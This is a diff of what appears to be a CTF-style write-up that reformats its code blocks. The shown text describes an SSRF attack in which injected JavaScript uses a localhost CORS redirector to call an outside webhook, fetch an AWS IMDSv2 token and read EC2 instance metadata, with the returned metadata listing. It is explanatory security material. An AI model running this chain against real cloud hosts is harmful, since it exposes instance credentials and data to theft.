@@ -29,13 +29,15 @@ So we do an "Hello world" test, which passes gracefully. <br>
 After that, we try to make our target use the CORS redirector on localhost: ```http://127.0.0.1/redir.php?url=[redacted]```
 <br>
 In the script:
-```
+
+{% highlight javascript %}
 const cors_proxy = "http://127.0.0.1/redir.php?url=";
 const webhook = "[redacted]";
 let http = new XMLHttpRequest();
 http.open("GET", cors_proxy + webhook, false);
 http.send();
-```
+{% endhighlight %}
+
 The "false" flag in http.open() is to instruct JS to make a synchronous request: you need it if you want the result of the request. <br>
 We see the GET request on the webhook, so we got to use the CORS proxy. <br>
 Now, to access AWS metadata, we need a token, because we are dealing with EC2. <br>
@@ -49,7 +51,8 @@ TOKEN='curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metad
 Therefore we have to make a PUT request to http://169.254.169.254/latest/api/token with the proper header, in order to get the token. <br> 
 Usually, CORS proxies only redirect GET requests; we can see with the webhook that this one redirects any method and any header. <br>
 At this point, to get the token and to read metadata, the script is:
-```
+
+{% highlight javascript %}
 const cors_proxy = "http://127.0.0.1/redir.php?url=";
 let http = new XMLHttpRequest();
 http.open("PUT", cors_proxy + "http://169.254.169.254/latest/api/token", false);
@@ -62,7 +65,8 @@ http.open("GET", cors_proxy + "http://169.254.169.254/latest/meta-data/", false)
 http.setRequestHeader("X-aws-ec2-metadata-token", token);
 http.send();
 document.write("Metadata: " + http.responseText + "; " + "Response headers: " + http.getAllResponseHeaders() + '<br>');
-```
+{% endhighlight %}
+
 I also included response headers in the PDF for debug purposes, in case something went wrong. <br>
 We got this response: <br> <br>
 ami-id ami-launch-index ami-manifest-path block-device-mapping/ events/ hibernation/ hostnameiam/ identity-credentials/ instance-action instance-id instance-life-cycle instance-type local-hostname local-ipv4mac metrics/ network/ placement/ profile public-hostname public-ipv4 public-keys/ reservation-id security-groups services/
